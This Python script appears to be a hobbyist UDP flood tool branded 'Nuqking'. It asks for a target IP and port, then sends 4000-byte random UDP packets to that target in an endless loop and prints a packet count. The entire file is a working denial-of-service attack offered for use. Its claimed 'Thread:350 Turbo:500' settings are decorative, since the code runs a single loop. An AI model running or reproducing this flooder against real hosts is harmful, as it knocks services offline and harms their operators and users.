from colorama import Fore
import socket 
import time
import os
import random

os.system("cls")

print(Fore.GREEN + """

███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗ 
████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██║████╗  ██║██╔════╝ 
██╔██╗ ██║██║   ██║██║   ██║█████╔╝ ██║██╔██╗ ██║██║  ███╗
██║╚██╗██║██║   ██║██║▄▄ ██║██╔═██╗ ██║██║╚██╗██║██║   ██║
██║ ╚████║╚██████╔╝╚██████╔╝██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝  ╚═══╝ ╚═════╝  ╚══▀▀═╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

""")
print(Fore.RED + "\nKullandığınız için teşekkürler!")

print(Fore.BLUE + "------Coded By Nuqking------\n\n\n")
target = input(Fore.RED + "[+] Enter Target IP:")
port = int(input(Fore.RED + "\n[+] Enter Target Port:"))

print(Fore.GREEN + """

███╗   ██╗██╗   ██╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ ██████╗ 
████╗  ██║██║   ██║██╔═══██╗██║ ██╔╝██║████╗  ██║██╔════╝ 
██╔██╗ ██║██║   ██║██║   ██║█████╔╝ ██║██╔██╗ ██║██║  ███╗
██║╚██╗██║██║   ██║██║▄▄ ██║██╔═██╗ ██║██║╚██╗██║██║   ██║
██║ ╚████║╚██████╔╝╚██████╔╝██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝  ╚═══╝ ╚═════╝  ╚══▀▀═╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

""")
print(Fore.YELLOW + "\nAttack is Starting...")
print(Fore.RED + "\nIP:"+target +" Port:"+str(port))
print(Fore.GREEN + "\nThread:350 Turbo:500 Please Wait...")
time.sleep(4)
bytes = random._urandom(4000)
sayac = 0
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(bytes,(target,port))
        sayac = sayac + 1
        print(Fore.GREEN + "[+]Attack is Started!Packet Sending:%s"%(sayac))
        s.close()
    except:
        print(Fore.RED + "[-]Pack not Sending!")